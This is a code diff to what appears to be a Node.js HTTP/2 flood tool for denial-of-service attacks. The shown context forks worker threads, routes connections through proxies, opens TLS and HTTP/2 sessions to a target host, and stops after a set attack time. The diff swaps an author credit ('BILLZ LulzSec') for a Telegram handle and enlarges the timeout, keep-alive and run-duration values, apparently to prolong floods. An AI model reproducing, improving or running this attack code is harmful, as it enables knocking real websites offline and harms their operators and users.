@@ -13873,7 +13873,7 @@
  const parsedTarget = url.parse(args.target);
 
  if (cluster.isMaster) {
-	 console.log(color('red', 'blue')('│ Method By BILLZ LulzSec │'));
+	 console.log(color('red', 'white')('│ Method By Telegram @Yusf048 │'));
     for (let counter = 1; counter <= args.threads; counter++) {
         cluster.fork();
     }
@@ -13893,8 +13893,8 @@
          port: options.port,
      });
  
-     connection.setTimeout(options.timeout * 100000);
-     connection.setKeepAlive(true, 100000);
+     connection.setTimeout(options.timeout * 1000000);
+     connection.setKeepAlive(true, 1000000);
  
      connection.on("connect", () => {
          connection.write(buffer);
@@ -13958,7 +13958,7 @@
      Socker.HTTP(proxyOptions, (connection, error) => {
          if (error) return
  
-         connection.setKeepAlive(true, 600000);
+         connection.setKeepAlive(true, 6000000);
 
          const tlsOptions = {
             ecdhCurve: "prime256v1:secp384r1:secp521r1",
@@ -13975,7 +13975,7 @@
 
          const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
 
-         tlsConn.setKeepAlive(true, 10 * 10000);
+         tlsConn.setKeepAlive(true, 10 * 1000000);
  
          const client = http2.connect(parsedTarget.href, {
              protocol: "https:",
@@ -14038,4 +14038,4 @@
  
  const KillScript = () => process.exit(1);
  
- setTimeout(KillScript, args.time * 1000);
+ setTimeout(KillScript, args.time * 1000000);
